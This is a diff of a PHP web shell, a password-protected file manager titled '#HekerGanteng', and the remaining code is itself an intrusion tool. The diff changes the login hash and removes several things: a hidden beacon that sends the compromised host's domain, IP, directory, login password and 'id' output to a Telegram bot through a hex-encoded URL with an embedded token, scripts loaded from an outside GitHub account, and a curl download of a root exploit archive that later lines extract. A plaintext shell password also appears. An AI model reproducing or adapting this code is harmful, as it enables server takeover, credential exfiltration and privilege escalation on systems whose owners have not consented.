@@ -4,7 +4,7 @@ error_reporting(0);
 ini_set('display_errors', 0);
 ini_set('log_errors', 0);
 
-$pw = '$2y$10$BtdjZ7dwlRNKoMoBUDp4m.rtDjnBNJ/HSQhdRWD3qAp.T9hSbYGIC';
+$pw = '$2b$10$DXR924EAZWjkaZ5SqSksduEKRegQMLebZ4gbG5Pn/gpvfNqiKib3m';
 
 function gets($url, $d) {
 
@@ -30,31 +30,6 @@ function gets($url, $d) {
 
 if (!isset($_SESSION['seslog']) && function_exists('password_verify') && isset($_POST['pass']) && $_POST['pass'] && password_verify($_POST['pass'], $pw)) {
 	$_SESSION['seslog'] = true;
-	$id = '-5175947437';
-	$ip = $_SERVER['REMOTE_ADDR'];
-	$dm = $_SERVER['HTTP_HOST'];
-	$url = $_SERVER['HTTP_REFERER'];
-	$dir = getcwd();
-	$pass = $_POST['pass'];
-	
-	$uname = function_exists('php_uname') ? @php_uname() : 'N/A';
-	$uid = function_exists('exec') ? (@exec('id 2>/dev/null', $o) ? implode("\n", $o) : 'N/A') : 'N/A';
-	
-	$msg = "<b>🔥 New Shell Detected 🔥</b>\n"
-    . "<b>🌐 Domain :</b> " . htmlspecialchars($dm) . "\n"
-    . "<b>🌍 IP :</b> " . htmlspecialchars($ip) . "\n"
-    . "<b>📁 Directory :</b> <code>" . htmlspecialchars($dir) . "</code>\n"
-    . "<b>🔗 Access :</b> " . htmlspecialchars($url) . "\n"
-    . "<b>🔑 Password :</b> <code>" . htmlspecialchars($pass) . "</code>\n"
-    . "<b>💻 Uname :</b> \n<pre>" . htmlspecialchars($uname) . "</pre>\n"
-    . "<b>👤 ID :</b> \n<pre>" . htmlspecialchars($uid) . "</pre>\n";
-
-	$data = [
-		'chat_id' => $id, 
-		'text' => $msg, 
-		'parse_mode' => 'HTML'
-	];
-	gets(hex2bin("68747470733a2f2f6170692e74656c656772616d2e6f72672f626f74363138343237303534353a4141474768694c595f38706433772d7a44754d423058344838377337725937565152512f73656e644d657373616765"), $data);
 }
 
 if (!isset($_SESSION['seslog'])) {
@@ -639,7 +614,6 @@ if (isset($_GET['info'])) {
 }
 
 if (isset($_GET['adm'])) {
-	$URL = "https://pukimai1337.github.io/kebutuhan/db/adm.txt";
 	if (!is_file('adminer.php')) {
 		file_put_contents("adminer.php", file_get_contents($URL));
 		header('Location: ?x='.hx($dark).'');
@@ -1029,14 +1003,11 @@ function win() {
 <html>
 	<head>
 		<meta charset="UTF-8">
-		<meta name="author" content="pukimai1337@gmail.com">
 		<meta content="width=device-width, initial-scale=0.7, maximum-scale=1, user-scalable=no" name="viewport">
 		<title><?= $_SERVER['HTTP_HOST']; ?> - #HekerGanteng</title>
 		<link href="//cdn.jsdelivr.net/npm/bootstrap@5.3.5/dist/css/bootstrap.min.css" rel="stylesheet">
 		<link href="//cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css" rel="stylesheet">
-		<link href="//pukimai1337.github.io/puki/dark.css" rel="stylesheet">
 		<script src="//cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
-		<script src="//pukimai1337.github.io/kebutuhan/puki.js"></script> 
 	</head>
 <body class="bg-secondary text-light">
 	<div class="container-fluid py-3">
@@ -1161,7 +1132,6 @@ function win() {
 							echo '<div class="text-center py-2">Scanning r00t..</div>';
 							if (!file_exists($dark."/r00ting/")) {
 								mkdir($dark."/r00ting");
-								rut("curl https://raw.githubusercontent.com/pukimai1337/kebutuhan/main/auto.tar.gz -o auto.tar.gz", $dark."/r00ting");
 								rut("tar -xf auto.tar.gz", $dark."/r00ting");
 								if (!file_exists($dark."/r00ting/netfilter")) {
 									rut("rm -rf r00ting", $dark);
@@ -1953,7 +1923,6 @@ Password: TheD4rk#1337</pre>
 	</div>
 	<script src="//code.jquery.com/jquery-3.7.0.js"></script>
 	<script src="//cdn.jsdelivr.net/npm/bootstrap@5.3.5/dist/js/bootstrap.bundle.min.js"></script>
-	<script src="//pukimai1337.github.io/puki/dark.js"></script>
 	<script type="text/javascript">
 	<?php if (isset($_GET['act']) && isset($_GET['item']) && $_GET['act'] === 'ef') : ?>
 		$(document).ready(function() { $("#em").modal("show"); });
